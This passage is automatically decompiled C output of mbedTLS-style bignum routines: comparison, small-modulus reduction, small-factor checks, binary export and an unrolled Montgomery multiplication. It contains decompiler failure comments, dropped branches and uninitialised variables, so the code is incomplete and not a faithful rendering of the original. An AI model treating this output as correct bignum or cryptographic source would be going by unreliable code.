            // branch -> 0x80565ed
            // Detected a possible infinite recursion (goto support failed); quitting...
        } else {
            v7 = v13;
            // 0x80565fc
            if (v7 >= v4) {
                // 0x80565a8
                if (v7 != v4) {
                    // 0x8056610
                    g2 = v6;
                    return -*a2;
                }
                // 0x80565aa
                result = *a1;
                v8 = *a2;
                g6 = v8;
                if (result >= 1) {
                    // 0x80565b2
                    if (v8 < 0) {
                        // 0x805661d
                        // branch -> 0x80565ed
                        // Detected a possible infinite recursion (goto support failed); quitting...
                    }
                }
                // 0x80565b8
                if (v8 >= 1) {
                    // 0x8056624
                    if (result <= 0) {
                        // 0x8056628
                        // branch -> 0x80565ed
                        // Detected a possible infinite recursion (goto support failed); quitting...
                    }
                }
                // 0x80565bc
                if (v4 == 0) {
                    // 0x80565eb
                    // branch -> 0x80565ed
                } else {
                    // 0x80565c2
                    v15 = *v5;
                    v12 = v4 - 1;
                    g6 = v12;
                    v16 = *(int32_t *)(v1 + 8);
                    v19 = 4 * v12;
                    v17 = *(int32_t *)(v15 + v19);
                    g4 = v17;
                    v18 = *(int32_t *)(v16 + v19);
                    if (v18 <= v17) {
                        // 0x80565d3
                        if (v18 < v17) {
                            // 0x8056619
                            // branch -> 0x80565ed
                        } else {
                            // 0x80565e7
                            if (v12 == 0) {
                                // 0x80565eb
                                // branch -> 0x80565ed
                            } else {
                                // 0x80565d8
                                v10 = v12;
                                // branch -> 0x80565d8
                                while (true) {
                                    // 0x80565d8
                                    v20 = 4 * v10;
                                    v21 = *(int32_t *)(v15 - 4 + v20);
                                    g4 = v21;
                                    v22 = *(int32_t *)(v16 - 4 + v20);
                                    if (v22 <= v21) {
                                        goto lab_0x80565e2_5;
                                    }
                                    // 0x80565ed
                                    // branch -> 0x80565ed
                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                }
                            }
                            // Detected a possible infinite recursion (goto support failed); quitting...
                        }
                        // Detected a possible infinite recursion (goto support failed); quitting...
                    }
                }
                // Detected a possible infinite recursion (goto support failed); quitting...
            }
        }
        // 0x8056602
        g2 = v6;
        return *a1;
    }
    // 0x80565a0
    if (v4 != 0) {
        // 0x80565a4
        // branch -> 0x8056602
        // 0x8056602
        g2 = v6;
        return *a1;
    }
    // 0x80565eb
    // branch -> 0x80565ed
    // Detected a possible infinite recursion (goto support failed); quitting...
}

// Address range: 0x8056630 - 0x805667f
int32_t mbedtls_mpi_cmp_int(int32_t a1, int32_t a2) {
    int32_t v1 = a2 >> 31 | 1; // bp-20
    int32_t result = mbedtls_mpi_cmp_mpi((int32_t *)a1, &v1); // 0x805666b
    int32_t v2;
    g2 = v2;
    return result;
}

// Address range: 0x8056680 - 0x805674f
int32_t mbedtls_mpi_mod_int(int32_t * a1, int32_t * a2, int64_t a3) {
    int32_t v1 = (int32_t)a1;
    int32_t v2 = (int32_t)a2;
    int32_t v3 = a3;
    if (v3 == 0) {
        // 0x805669e
        return -12;
    }
    // 0x80566b0
    if (v3 < 0) {
        // 0x805671b
        // branch -> 0x805669e
        // 0x805669e
        return -10;
    }
    // 0x80566b2
    if (v3 == 1) {
        // 0x8056722
        *a1 = 0;
        // branch -> 0x805669e
        // 0x805669e
        return 0;
    }
    // 0x80566b7
    if (v3 == 2) {
        // 0x8056732
        g6 = v1;
        *a1 = *(int32_t *)*(int32_t *)(v2 + 8) % 2;
        // branch -> 0x805669e
    } else {
        int32_t v4 = *(int32_t *)(v2 + 4); // 0x80566c1
        int32_t v5 = 0; // 0x8056717
        if (v4 != 0) {
            uint64_t v6 = a3 & 0xffffffff; // 0x80566e0
            int32_t v7 = *(int32_t *)(v2 + 8) - 4 + 4 * v4; // 0x80566d0
            int32_t v8 = *(int32_t *)v7 / 0x10000; // 0x80566dc
            uint16_t v9 = *(int16_t *)v7; // 0x80566e9
            int32_t v10 = 0x10000 * (v8 - (int32_t)((int64_t)v8 / v6) * v3) | (int32_t)v9; // 0x80566f1
            int32_t v11 = (int32_t)((int64_t)v10 / v6) * v3; // 0x80566f7
            int32_t v12 = v10 - v11; // 0x80566fa
            int32_t v13 = v4 - 1; // 0x80566fc
            // branch -> 0x80566d0
            while (v13 != 0) {
                // 0x80566d0
                v4 = v13;
                v7 = *(int32_t *)(v2 + 8) - 4 + 4 * v4;
                v8 = *(int32_t *)v7 / 0x10000 | 0x10000 * v12;
                v9 = *(int16_t *)v7;
                v10 = 0x10000 * (v8 - (int32_t)((int64_t)v8 / v6) * v3) | (int32_t)v9;
                v11 = (int32_t)((int64_t)v10 / v6) * v3;
                v12 = v10 - v11;
                v13 = v4 - 1;
                // continue -> 0x80566d0
            }
            // 0x8056701
            if (v10 != v11) {
                // 0x8056705
                if (*a2 <= 0) {
                    // 0x805670e
                    v5 = v3 - v12;
                    // branch -> 0x8056712
                } else {
                    v5 = v12;
                }
            } else {
                v5 = 0;
            }
        }
        // 0x8056712
        g6 = v1;
        *a1 = v5;
        // branch -> 0x805669e
    }
    // 0x805669e
    return 0;
}

// Address range: 0x8056750 - 0x80567cc
int32_t mpi_check_small_factors(int32_t a1) {
    int32_t v1 = g5; // 0x8056753
    int32_t v2 = g1; // 0x8056754
    g5 = v2;
    int32_t v3 = g7; // 0x8056756
    int32_t v4 = g3; // 0x8056757
    if (*(char *)*(int32_t *)(v2 + 8) == 1) {
        // 0x80567c0
        g1 = -14;
        g3 = v4;
        g7 = v3;
        g5 = v1;
        return -14;
    }
    // 0x8056763
    g3 = 3;
    g7 = 0;
    if (mbedtls_mpi_cmp_int(v2, 3) < 1) {
        // 0x80567ac
        g1 = 1;
        // branch -> 0x80567b1
    } else {
        while (true) {
            // 0x8056770
            int32_t v5;
            int32_t v6 = mbedtls_mpi_mod_int(&v5, (int32_t *)g5, (int64_t)g3); // 0x805677e
            g1 = v6;
            if (v6 == 0) {
                g6 = v5;
                if (v5 == 0) {
                    // 0x80567c0
                    // branch -> 0x80567c0
                    // 0x80567c0
                    g1 = -14;
                    g3 = v4;
                    g7 = v3;
                    g5 = v1;
                    return -14;
                }
                int32_t v7 = g7 + 1; // 0x805678e
                g7 = v7;
                int32_t v8 = *(int32_t *)(4 * v7 + (int32_t)&g42); // 0x8056791
                g3 = v8;
                if (v8 < 1) {
                    // 0x80567b1
                    g3 = v4;
                    g7 = v3;
                    g5 = v1;
                    return 0;
                }
                // 0x805678e
                if (mbedtls_mpi_cmp_int(g5, v8) < 1) {
                    // break -> 0x80567ac
                    break;
                }
                // continue -> 0x8056770
                continue;
            }
        }
        // 0x80567ac
        g1 = 1;
        // branch -> 0x80567b1
    }
    // 0x80567b1
    g3 = v4;
    g7 = v3;
    g5 = v1;
    return 1;
}

// Address range: 0x80567cd - 0x80567cf
int32_t function_80567cd(int32_t a1) {
    // 0x80567cd
    return g7;
}

// Address range: 0x80567d0 - 0x805684c
int32_t mbedtls_mpi_write_binary(char * a1, int32_t a2, int32_t a3) {
    int32_t v1 = g3; // bp-16
    int32_t v2 = (int32_t)a1;
    g3 = v2;
    int32_t v3 = mbedtls_mpi_size(v2); // 0x80567e5
    uint32_t v4 = a3; // 0x80567f2
    if (v3 > v4) {
        // 0x80567f7
        g3 = v1;
        return -8;
    }
    // 0x8056800
    memset((char *)a2, 0, v4);
    g4 = v3;
    if (v3 == 0) {
        // 0x8056843
        g3 = v1;
        return 0;
    }
    int32_t v5 = a3 + a2; // 0x805681b
    a3 = v5;
    uint32_t v6 = 0; // 0x8056830
    // branch -> 0x8056820
    while (true) {
        uint32_t v7 = v6 % 4; // 0x805682a
        int32_t v8 = 8 * v7; // 0x805682d
        g4 = v8;
        uint32_t v9 = *(int32_t *)(4 * v6 / 4 + *(int32_t *)(g3 + 8)); // 0x8056833
        g6 = v9;
        char v10 = v9;
        if (v7 != 0) {
            int32_t v11 = v9 >> v8; // 0x8056836
            g6 = v11;
            v10 = v11;
            // branch -> after_if_8056836_0
        }
        // after_if_8056836_0
        *(char *)(v5 - 1) = v10;
        int32_t v12 = a3 - 1; // 0x805683b
        a3 = v12;
        int32_t v13 = v6 + 1; // 0x805683e
        if (v3 == v13) {
            // break -> 0x8056843
            break;
        }
        v5 = v12;
        v6 = v13;
        // continue -> 0x8056820
    }
    // 0x8056843
    g3 = v1;
    return 0;
}

// Address range: 0x805684d - 0x805684f
int32_t function_805684d(int32_t a1) {
    // 0x805684d
    return g7;
}

// Address range: 0x8056850 - 0x8056faf
int32_t mpi_montmul(int64_t a1, int32_t result4, int32_t a3, int32_t a4, int32_t a5) {
    int32_t v1 = g5; // 0x8056853
    int32_t v2 = g7; // 0x8056854
    int32_t v3 = g3; // 0x8056855
    int32_t result8 = g4; // 0x8056864
    int32_t * v4 = (int32_t *)(result4 + 8); // 0x805686a_0
    memset((char *)*v4, 0, 4 * *(int32_t *)(result4 + 4));
    uint32_t v5 = *(int32_t *)(result8 + 4); // 0x805688a
    int32_t v6 = *v4; // 0x805688d
    int32_t * v7 = (int32_t *)(g6 + 4); // 0x8056890_0
    int32_t v8 = v5; // 0x80568a2
    if (*v7 <= v5) {
        // if_8056899_1_true
        v8 = *v7;
        // branch -> after_if_8056899_1
    }
    // after_if_8056899_1
    int32_t v9;
    int32_t v10;
    int32_t v11;
    if (v5 == 0) {
        // 0x8056f99
        v11 = 4;
        v9 = *(int32_t *)(g1 + 8);
        v10 = v6;
        // branch -> 0x8056e56
    } else {
        int32_t v12 = *(int32_t *)(g6 + 8); // 0x80568ae
        int32_t v13 = *(int32_t *)(g1 + 8); // 0x80568b7
        int32_t v14 = 4 * v5; // 0x80568c0
        int32_t v15 = v14 + 4; // 0x80568c0
        int32_t v16 = *(int32_t *)(result8 + 8); // 0x80568d3
        int32_t v17 = v6;
        int32_t v18 = 0; // 0x8056e28270
        // branch -> 0x80568f0
        while (true) {
            int32_t v19 = *(int32_t *)(4 * v18 + v13); // 0x80568fc
            int32_t * v20 = (int32_t *)v17; // 0x805690d_0
            int64_t v21 = v19;
            int32_t v22 = v17;
            int32_t v23 = v12;
            int32_t v24 = 0; // 0x8056e1a281
            int32_t v25 = v8;
            int32_t v26; // ebx
            if (v8 >= 16) {
                int32_t v27 = v17;
                int32_t v28 = v12;
                int32_t v29 = v8 - 16; // 0x8056940
                v26 = v19;
                uint64_t v30 = (int64_t)*(int32_t *)v28 * (int64_t)v19; // 0x8056953
                uint32_t v31 = (int32_t)v30; // 0x8056953
                uint32_t v32 = v31; // 0x8056955
                int32_t * v33 = (int32_t *)v27; // 0x805695a_0
                uint32_t v34 = v32 + *v33; // 0x805695a
                *v33 = v34;
                uint32_t v35 = *(int32_t *)(v28 + 4); // 0x8056962
                uint64_t v36 = (int64_t)v26 * (int64_t)v35; // 0x8056963
                uint32_t v37 = (int32_t)v36; // 0x8056963
                uint32_t v38 = (int32_t)(v34 < v32) + (int32_t)(v32 < v31) + (int32_t)(v30 / 0x100000000) + v37; // 0x8056965
                int32_t * v39 = (int32_t *)(v27 + 4); // 0x805696a_0
                uint32_t v40 = v38 + *v39; // 0x805696a
                *v39 = v40;
                uint32_t v41 = *(int32_t *)(v28 + 8); // 0x8056972
                uint64_t v42 = (int64_t)v26 * (int64_t)v41; // 0x8056973
                uint32_t v43 = (int32_t)v42; // 0x8056973
                uint32_t v44 = (int32_t)(v40 < v38) + (int32_t)(v38 < v37) + (int32_t)(v36 / 0x100000000) + v43; // 0x8056975
                int32_t * v45 = (int32_t *)(v27 + 8); // 0x805697a_0
                uint32_t v46 = v44 + *v45; // 0x805697a
                *v45 = v46;
                uint32_t v47 = *(int32_t *)(v28 + 12); // 0x8056982
                uint64_t v48 = (int64_t)v26 * (int64_t)v47; // 0x8056983
                uint32_t v49 = (int32_t)v48; // 0x8056983
                uint32_t v50 = (int32_t)(v46 < v44) + (int32_t)(v44 < v43) + (int32_t)(v42 / 0x100000000) + v49; // 0x8056985
                int32_t * v51 = (int32_t *)(v27 + 12); // 0x805698a_0
                uint32_t v52 = v50 + *v51; // 0x805698a
                *v51 = v52;
                uint32_t v53 = *(int32_t *)(v28 + 16); // 0x8056992
                uint64_t v54 = (int64_t)v26 * (int64_t)v53; // 0x8056993
                uint32_t v55 = (int32_t)v54; // 0x8056993
                uint32_t v56 = (int32_t)(v52 < v50) + (int32_t)(v50 < v49) + (int32_t)(v48 / 0x100000000) + v55; // 0x8056995
                int32_t * v57 = (int32_t *)(v27 + 16); // 0x805699a_0
                uint32_t v58 = v56 + *v57; // 0x805699a
                *v57 = v58;
                uint32_t v59 = *(int32_t *)(v28 + 20); // 0x80569a2
                uint64_t v60 = (int64_t)v26 * (int64_t)v59; // 0x80569a3
                uint32_t v61 = (int32_t)v60; // 0x80569a3
                uint32_t v62 = (int32_t)(v58 < v56) + (int32_t)(v56 < v55) + (int32_t)(v54 / 0x100000000) + v61; // 0x80569a5
                int32_t * v63 = (int32_t *)(v27 + 20); // 0x80569aa_0
                uint32_t v64 = v62 + *v63; // 0x80569aa
                *v63 = v64;
                uint32_t v65 = *(int32_t *)(v28 + 24); // 0x80569b2
                uint64_t v66 = (int64_t)v26 * (int64_t)v65; // 0x80569b3
                uint32_t v67 = (int32_t)v66; // 0x80569b3
                uint32_t v68 = (int32_t)(v64 < v62) + (int32_t)(v62 < v61) + (int32_t)(v60 / 0x100000000) + v67; // 0x80569b5
                int32_t * v69 = (int32_t *)(v27 + 24); // 0x80569ba_0
                uint32_t v70 = v68 + *v69; // 0x80569ba
                *v69 = v70;
                uint32_t v71 = *(int32_t *)(v28 + 28); // 0x80569c2
                uint64_t v72 = (int64_t)v26 * (int64_t)v71; // 0x80569c3
                uint32_t v73 = (int32_t)v72; // 0x80569c3
                uint32_t v74 = (int32_t)(v70 < v68) + (int32_t)(v68 < v67) + (int32_t)(v66 / 0x100000000) + v73; // 0x80569c5
                int32_t * v75 = (int32_t *)(v27 + 28); // 0x80569ca_0
                uint32_t v76 = v74 + *v75; // 0x80569ca
                *v75 = v76;
                uint32_t v77 = *(int32_t *)(v28 + 32); // 0x80569d2
                uint64_t v78 = (int64_t)v26 * (int64_t)v77; // 0x80569d3
                uint32_t v79 = (int32_t)v78; // 0x80569d3
                uint32_t v80 = (int32_t)(v76 < v74) + (int32_t)(v74 < v73) + (int32_t)(v72 / 0x100000000) + v79; // 0x80569d5
                int32_t * v81 = (int32_t *)(v27 + 32); // 0x80569da_0
                uint32_t v82 = v80 + *v81; // 0x80569da
                *v81 = v82;
                uint32_t v83 = *(int32_t *)(v28 + 36); // 0x80569e2
                uint64_t v84 = (int64_t)v26 * (int64_t)v83; // 0x80569e3
                uint32_t v85 = (int32_t)v84; // 0x80569e3
                uint32_t v86 = (int32_t)(v82 < v80) + (int32_t)(v80 < v79) + (int32_t)(v78 / 0x100000000) + v85; // 0x80569e5
                int32_t * v87 = (int32_t *)(v27 + 36); // 0x80569ea_0
                uint32_t v88 = v86 + *v87; // 0x80569ea
                *v87 = v88;
                uint32_t v89 = *(int32_t *)(v28 + 40); // 0x80569f2
                uint64_t v90 = (int64_t)v26 * (int64_t)v89; // 0x80569f3
                uint32_t v91 = (int32_t)v90; // 0x80569f3
                uint32_t v92 = (int32_t)(v88 < v86) + (int32_t)(v86 < v85) + (int32_t)(v84 / 0x100000000) + v91; // 0x80569f5
                int32_t * v93 = (int32_t *)(v27 + 40); // 0x80569fa_0
                uint32_t v94 = v92 + *v93; // 0x80569fa
                *v93 = v94;
                uint32_t v95 = *(int32_t *)(v28 + 44); // 0x8056a02
                uint64_t v96 = (int64_t)v26 * (int64_t)v95; // 0x8056a03
                uint32_t v97 = (int32_t)v96; // 0x8056a03
                uint32_t v98 = (int32_t)(v94 < v92) + (int32_t)(v92 < v91) + (int32_t)(v90 / 0x100000000) + v97; // 0x8056a05
                int32_t * v99 = (int32_t *)(v27 + 44); // 0x8056a0a_0
                uint32_t v100 = v98 + *v99; // 0x8056a0a
                *v99 = v100;
                uint32_t v101 = *(int32_t *)(v28 + 48); // 0x8056a12
                uint64_t v102 = (int64_t)v26 * (int64_t)v101; // 0x8056a13
                uint32_t v103 = (int32_t)v102; // 0x8056a13
                uint32_t v104 = (int32_t)(v100 < v98) + (int32_t)(v98 < v97) + (int32_t)(v96 / 0x100000000) + v103; // 0x8056a15
                int32_t * v105 = (int32_t *)(v27 + 48); // 0x8056a1a_0
                uint32_t v106 = v104 + *v105; // 0x8056a1a
                *v105 = v106;
                uint32_t v107 = *(int32_t *)(v28 + 52); // 0x8056a22
                uint64_t v108 = (int64_t)v26 * (int64_t)v107; // 0x8056a23
                uint32_t v109 = (int32_t)v108; // 0x8056a23
                uint32_t v110 = (int32_t)(v106 < v104) + (int32_t)(v104 < v103) + (int32_t)(v102 / 0x100000000) + v109; // 0x8056a25
                int32_t * v111 = (int32_t *)(v27 + 52); // 0x8056a2a_0
                uint32_t v112 = v110 + *v111; // 0x8056a2a
                *v111 = v112;
                uint32_t v113 = *(int32_t *)(v28 + 56); // 0x8056a32
                uint64_t v114 = (int64_t)v26 * (int64_t)v113; // 0x8056a33
                uint32_t v115 = (int32_t)v114; // 0x8056a33
                uint32_t v116 = (int32_t)(v112 < v110) + (int32_t)(v110 < v109) + (int32_t)(v108 / 0x100000000) + v115; // 0x8056a35
                int32_t * v117 = (int32_t *)(v27 + 56); // 0x8056a3a_0
                uint32_t v118 = v116 + *v117; // 0x8056a3a
                *v117 = v118;
                uint32_t v119 = *(int32_t *)(v28 + 60); // 0x8056a42
                g7 = v28 + 64;
                uint64_t v120 = (int64_t)v26 * (int64_t)v119; // 0x8056a43
                uint32_t v121 = (int32_t)v120; // 0x8056a43
                uint32_t v122 = (int32_t)(v118 < v116) + (int32_t)(v116 < v115) + (int32_t)(v114 / 0x100000000) + v121; // 0x8056a45
                int32_t * v123 = (int32_t *)(v27 + 60); // 0x8056a4a_0
                uint32_t v124 = v122 + *v123; // 0x8056a4a
                int32_t v125 = (int32_t)(v124 < v122) + (int32_t)(v122 < v121) + (int32_t)(v120 / 0x100000000); // 0x8056a4c
                *v123 = v124;
                int32_t v126 = v27 + 64; // 0x8056a51
                g5 = v126;
                int32_t v127 = g7; // 0x8056a5b
                // branch -> 0x8056940
                while (v29 > 15) {
                    // 0x8056940
                    v27 = v126;
                    v28 = v127;
                    v29 -= 16;
                    v26 = v19;
                    v30 = (int64_t)*(int32_t *)v28 * (int64_t)v19;
                    v31 = (int32_t)v30;
                    v32 = v31 + v125;
                    v33 = (int32_t *)v27;
                    v34 = v32 + *v33;
                    *v33 = v34;
                    v35 = *(int32_t *)(v28 + 4);
                    v36 = (int64_t)v26 * (int64_t)v35;
                    v37 = (int32_t)v36;
                    v38 = (int32_t)(v34 < v32) + (int32_t)(v32 < v31) + (int32_t)(v30 / 0x100000000) + v37;
                    v39 = (int32_t *)(v27 + 4);
                    v40 = v38 + *v39;
                    *v39 = v40;
                    v41 = *(int32_t *)(v28 + 8);
                    v42 = (int64_t)v26 * (int64_t)v41;
                    v43 = (int32_t)v42;
                    v44 = (int32_t)(v40 < v38) + (int32_t)(v38 < v37) + (int32_t)(v36 / 0x100000000) + v43;
                    v45 = (int32_t *)(v27 + 8);
                    v46 = v44 + *v45;
                    *v45 = v46;
                    v47 = *(int32_t *)(v28 + 12);
                    v48 = (int64_t)v26 * (int64_t)v47;
                    v49 = (int32_t)v48;
                    v50 = (int32_t)(v46 < v44) + (int32_t)(v44 < v43) + (int32_t)(v42 / 0x100000000) + v49;
                    v51 = (int32_t *)(v27 + 12);
                    v52 = v50 + *v51;
                    *v51 = v52;
                    v53 = *(int32_t *)(v28 + 16);
                    v54 = (int64_t)v26 * (int64_t)v53;
                    v55 = (int32_t)v54;
                    v56 = (int32_t)(v52 < v50) + (int32_t)(v50 < v49) + (int32_t)(v48 / 0x100000000) + v55;
                    v57 = (int32_t *)(v27 + 16);
                    v58 = v56 + *v57;
                    *v57 = v58;
                    v59 = *(int32_t *)(v28 + 20);
                    v60 = (int64_t)v26 * (int64_t)v59;
                    v61 = (int32_t)v60;
                    v62 = (int32_t)(v58 < v56) + (int32_t)(v56 < v55) + (int32_t)(v54 / 0x100000000) + v61;
                    v63 = (int32_t *)(v27 + 20);
                    v64 = v62 + *v63;
                    *v63 = v64;
                    v65 = *(int32_t *)(v28 + 24);
                    v66 = (int64_t)v26 * (int64_t)v65;
                    v67 = (int32_t)v66;
                    v68 = (int32_t)(v64 < v62) + (int32_t)(v62 < v61) + (int32_t)(v60 / 0x100000000) + v67;
                    v69 = (int32_t *)(v27 + 24);
                    v70 = v68 + *v69;
                    *v69 = v70;
                    v71 = *(int32_t *)(v28 + 28);
                    v72 = (int64_t)v26 * (int64_t)v71;
                    v73 = (int32_t)v72;
                    v74 = (int32_t)(v70 < v68) + (int32_t)(v68 < v67) + (int32_t)(v66 / 0x100000000) + v73;
                    v75 = (int32_t *)(v27 + 28);
                    v76 = v74 + *v75;
                    *v75 = v76;
                    v77 = *(int32_t *)(v28 + 32);
                    v78 = (int64_t)v26 * (int64_t)v77;
                    v79 = (int32_t)v78;
                    v80 = (int32_t)(v76 < v74) + (int32_t)(v74 < v73) + (int32_t)(v72 / 0x100000000) + v79;
                    v81 = (int32_t *)(v27 + 32);
                    v82 = v80 + *v81;
                    *v81 = v82;
                    v83 = *(int32_t *)(v28 + 36);
                    v84 = (int64_t)v26 * (int64_t)v83;
                    v85 = (int32_t)v84;
                    v86 = (int32_t)(v82 < v80) + (int32_t)(v80 < v79) + (int32_t)(v78 / 0x100000000) + v85;
                    v87 = (int32_t *)(v27 + 36);
                    v88 = v86 + *v87;
                    *v87 = v88;
                    v89 = *(int32_t *)(v28 + 40);
                    v90 = (int64_t)v26 * (int64_t)v89;
                    v91 = (int32_t)v90;
                    v92 = (int32_t)(v88 < v86) + (int32_t)(v86 < v85) + (int32_t)(v84 / 0x100000000) + v91;
                    v93 = (int32_t *)(v27 + 40);
                    v94 = v92 + *v93;
                    *v93 = v94;
                    v95 = *(int32_t *)(v28 + 44);
                    v96 = (int64_t)v26 * (int64_t)v95;
                    v97 = (int32_t)v96;
                    v98 = (int32_t)(v94 < v92) + (int32_t)(v92 < v91) + (int32_t)(v90 / 0x100000000) + v97;
                    v99 = (int32_t *)(v27 + 44);
                    v100 = v98 + *v99;
                    *v99 = v100;
                    v101 = *(int32_t *)(v28 + 48);
                    v102 = (int64_t)v26 * (int64_t)v101;
                    v103 = (int32_t)v102;
                    v104 = (int32_t)(v100 < v98) + (int32_t)(v98 < v97) + (int32_t)(v96 / 0x100000000) + v103;
                    v105 = (int32_t *)(v27 + 48);
                    v106 = v104 + *v105;
                    *v105 = v106;
                    v107 = *(int32_t *)(v28 + 52);
                    v108 = (int64_t)v26 * (int64_t)v107;
                    v109 = (int32_t)v108;
                    v110 = (int32_t)(v106 < v104) + (int32_t)(v104 < v103) + (int32_t)(v102 / 0x100000000) + v109;
                    v111 = (int32_t *)(v27 + 52);
                    v112 = v110 + *v111;
                    *v111 = v112;
                    v113 = *(int32_t *)(v28 + 56);
                    v114 = (int64_t)v26 * (int64_t)v113;
                    v115 = (int32_t)v114;
                    v116 = (int32_t)(v112 < v110) + (int32_t)(v110 < v109) + (int32_t)(v108 / 0x100000000) + v115;
                    v117 = (int32_t *)(v27 + 56);
                    v118 = v116 + *v117;
                    *v117 = v118;
                    v119 = *(int32_t *)(v28 + 60);
                    g7 = v28 + 64;
                    v120 = (int64_t)v26 * (int64_t)v119;
                    v121 = (int32_t)v120;
                    v122 = (int32_t)(v118 < v116) + (int32_t)(v116 < v115) + (int32_t)(v114 / 0x100000000) + v121;
                    v123 = (int32_t *)(v27 + 60);
                    v124 = v122 + *v123;
                    v125 = (int32_t)(v124 < v122) + (int32_t)(v122 < v121) + (int32_t)(v120 / 0x100000000);
                    *v123 = v124;
                    v126 = v27 + 64;
                    g5 = v126;
                    v127 = g7;
                    // continue -> 0x8056940
                }
                // 0x8056a67
                v22 = 64 * (v8 - 16) / 16 + 64 + v17;
                v23 = v127;
                v24 = v125;
                v25 = v8 % 16;
                // branch -> 0x8056a6d
            }
            int32_t v128 = v22;
            int32_t v129 = v25;
            if (v25 >= 8) {
                int32_t v130 = v22;
                int32_t v131 = v25 - 8; // 0x8056a80
                v26 = v19;
                uint64_t v132 = (int64_t)*(int32_t *)v23 * (int64_t)v19; // 0x8056a93
                uint32_t v133 = (int32_t)v132; // 0x8056a93
                uint32_t v134 = v133 + v24; // 0x8056a95
                int32_t * v135 = (int32_t *)v130; // 0x8056a9a_0
                uint32_t v136 = v134 + *v135; // 0x8056a9a
                *v135 = v136;
                uint32_t v137 = *(int32_t *)(v23 + 4); // 0x8056aa2
                uint64_t v138 = (int64_t)v26 * (int64_t)v137; // 0x8056aa3
                uint32_t v139 = (int32_t)v138; // 0x8056aa3
                uint32_t v140 = (int32_t)(v136 < v134) + (int32_t)(v134 < v133) + (int32_t)(v132 / 0x100000000) + v139; // 0x8056aa5
                int32_t * v141 = (int32_t *)(v130 + 4); // 0x8056aaa_0
                uint32_t v142 = v140 + *v141; // 0x8056aaa
                *v141 = v142;
                uint32_t v143 = *(int32_t *)(v23 + 8); // 0x8056ab2
                uint64_t v144 = (int64_t)v26 * (int64_t)v143; // 0x8056ab3
                uint32_t v145 = (int32_t)v144; // 0x8056ab3
                uint32_t v146 = (int32_t)(v142 < v140) + (int32_t)(v140 < v139) + (int32_t)(v138 / 0x100000000) + v145; // 0x8056ab5
                int32_t * v147 = (int32_t *)(v130 + 8); // 0x8056aba_0
                uint32_t v148 = v146 + *v147; // 0x8056aba
                *v147 = v148;
                uint32_t v149 = *(int32_t *)(v23 + 12); // 0x8056ac2
                uint64_t v150 = (int64_t)v26 * (int64_t)v149; // 0x8056ac3
                uint32_t v151 = (int32_t)v150; // 0x8056ac3
                uint32_t v152 = (int32_t)(v148 < v146) + (int32_t)(v146 < v145) + (int32_t)(v144 / 0x100000000) + v151; // 0x8056ac5
                int32_t * v153 = (int32_t *)(v130 + 12); // 0x8056aca_0
                uint32_t v154 = v152 + *v153; // 0x8056aca
                *v153 = v154;
                uint32_t v155 = *(int32_t *)(v23 + 16); // 0x8056ad2
                uint64_t v156 = (int64_t)v26 * (int64_t)v155; // 0x8056ad3
                uint32_t v157 = (int32_t)v156; // 0x8056ad3
                uint32_t v158 = (int32_t)(v154 < v152) + (int32_t)(v152 < v151) + (int32_t)(v150 / 0x100000000) + v157; // 0x8056ad5
                int32_t * v159 = (int32_t *)(v130 + 16); // 0x8056ada_0
                uint32_t v160 = v158 + *v159; // 0x8056ada
                *v159 = v160;
                uint32_t v161 = *(int32_t *)(v23 + 20); // 0x8056ae2
                uint64_t v162 = (int64_t)v26 * (int64_t)v161; // 0x8056ae3
                uint32_t v163 = (int32_t)v162; // 0x8056ae3
                uint32_t v164 = (int32_t)(v160 < v158) + (int32_t)(v158 < v157) + (int32_t)(v156 / 0x100000000) + v163; // 0x8056ae5
                int32_t * v165 = (int32_t *)(v130 + 20); // 0x8056aea_0
                uint32_t v166 = v164 + *v165; // 0x8056aea
                *v165 = v166;
                uint32_t v167 = *(int32_t *)(v23 + 24); // 0x8056af2
                uint64_t v168 = (int64_t)v26 * (int64_t)v167; // 0x8056af3
                uint32_t v169 = (int32_t)v168; // 0x8056af3
                uint32_t v170 = (int32_t)(v166 < v164) + (int32_t)(v164 < v163) + (int32_t)(v162 / 0x100000000) + v169; // 0x8056af5
                int32_t * v171 = (int32_t *)(v130 + 24); // 0x8056afa_0
                uint32_t v172 = v170 + *v171; // 0x8056afa
                *v171 = v172;
                uint32_t v173 = *(int32_t *)(v23 + 28); // 0x8056b02
                g7 = v23 + 32;
                uint64_t v174 = (int64_t)v26 * (int64_t)v173; // 0x8056b03
                uint32_t v175 = (int32_t)v174; // 0x8056b03
                uint32_t v176 = (int32_t)(v172 < v170) + (int32_t)(v170 < v169) + (int32_t)(v168 / 0x100000000) + v175; // 0x8056b05
                int32_t * v177 = (int32_t *)(v130 + 28); // 0x8056b0a_0
                uint32_t v178 = v176 + *v177; // 0x8056b0a
                int32_t v179 = (int32_t)(v178 < v176) + (int32_t)(v176 < v175) + (int32_t)(v174 / 0x100000000); // 0x8056b0c
                *v177 = v178;
                int32_t v180 = v130 + 32; // 0x8056b11
                g5 = v180;
                int32_t v181 = g7; // 0x8056b1b
                // branch -> 0x8056a80
                while (v131 > 7) {
                    // 0x8056a80
                    v130 = v180;
                    v23 = v181;
                    v131 -= 8;
                    v26 = v19;
                    v132 = (int64_t)*(int32_t *)v23 * (int64_t)v19;
                    v133 = (int32_t)v132;
                    v134 = v133 + v179;
                    v135 = (int32_t *)v130;
                    v136 = v134 + *v135;
                    *v135 = v136;
                    v137 = *(int32_t *)(v23 + 4);
                    v138 = (int64_t)v26 * (int64_t)v137;
                    v139 = (int32_t)v138;
                    v140 = (int32_t)(v136 < v134) + (int32_t)(v134 < v133) + (int32_t)(v132 / 0x100000000) + v139;
                    v141 = (int32_t *)(v130 + 4);
                    v142 = v140 + *v141;
                    *v141 = v142;
                    v143 = *(int32_t *)(v23 + 8);
                    v144 = (int64_t)v26 * (int64_t)v143;
                    v145 = (int32_t)v144;
                    v146 = (int32_t)(v142 < v140) + (int32_t)(v140 < v139) + (int32_t)(v138 / 0x100000000) + v145;
                    v147 = (int32_t *)(v130 + 8);
                    v148 = v146 + *v147;
                    *v147 = v148;
                    v149 = *(int32_t *)(v23 + 12);
                    v150 = (int64_t)v26 * (int64_t)v149;
                    v151 = (int32_t)v150;
                    v152 = (int32_t)(v148 < v146) + (int32_t)(v146 < v145) + (int32_t)(v144 / 0x100000000) + v151;
                    v153 = (int32_t *)(v130 + 12);
                    v154 = v152 + *v153;
                    *v153 = v154;
                    v155 = *(int32_t *)(v23 + 16);
                    v156 = (int64_t)v26 * (int64_t)v155;
                    v157 = (int32_t)v156;
